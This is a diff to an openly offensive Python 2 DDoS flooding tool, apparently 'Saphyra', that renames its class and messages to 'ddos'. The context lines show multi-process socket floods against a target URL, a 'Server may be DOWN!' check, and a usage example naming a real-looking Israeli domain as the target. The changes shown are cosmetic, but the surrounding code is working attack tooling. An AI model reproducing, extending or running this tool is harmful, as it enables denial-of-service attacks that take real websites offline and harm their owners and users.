@@ -28,7 +28,7 @@ DEFAULT_SOCKETS=4000
 with open('lists/useragents.txt') as f:
     USER_AGENT_PARTS = f.readlines()
 
-class Saphyra(object):
+class ddos(object):
 
     # Counters
     counter = [0, 0]
@@ -104,7 +104,7 @@ class Saphyra(object):
         try:
             if self.counter[0] > 0 or self.counter[1] > 0:
 
-                print "{0} Saphyra strikes deferred. ({1} Failed)".format(self.counter[0], self.counter[1])
+                print "{0} DDOS attack strikes deferred. ({1} Failed)".format(self.counter[0], self.counter[1])
 
                 if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                     print "\tServer may be DOWN!"
@@ -441,8 +441,8 @@ class Striker(Process):
             pass
         
 def usage():
-	print 'Usage: Saphyra (url)'
-	print 'Example: Saphyra.py http://luthi.co.il/'
+	print 'Usage: ddos (url)'
+	print 'Example: ddos.py http://luthi.co.il/'
 	print "\a"
 print \
 """
@@ -474,7 +474,7 @@ ___<__(|) _   **-/  / /   /
       /  / /   /  
      /  |,'   /  
     :   /    /
-    [  /   ,'     ~>DDoS Tool by PS<~
+    [  /   ,'     ~>DDoS Tool by ps<~
     | /  ,'    
     |/,-'
     '
@@ -548,13 +548,13 @@ def main():
             except EnvironmentError:
                     error("cannot read file {0}".format(uas_file))
 
-        saphyra = Saphyra(url)
-        saphyra.useragents = useragents
-        saphyra.nr_workers = workers
-        saphyra.method = method
-        saphyra.nr_sockets = socks
+        ddos = ddos(url)
+        ddos.useragents = useragents
+        ddos.nr_workers = workers
+        ddos.method = method
+        ddos.nr_sockets = socks
 
-        saphyra.fire()
+        ddos.fire()
 
     except getopt.GetoptError, err:
 
